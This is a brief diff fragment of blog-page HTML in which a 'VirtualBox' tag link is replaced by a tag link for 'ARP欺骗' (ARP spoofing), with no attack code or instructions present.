-                    <a href="/tags/VirtualBox/">
-                        <span class="chip bg-color">VirtualBox</span>
+                    <a href="/tags/ARP%E6%AC%BA%E9%AA%97/">
+                        <span class="chip bg-color">ARP欺骗</span>
                     </a>
                     
                 </div>
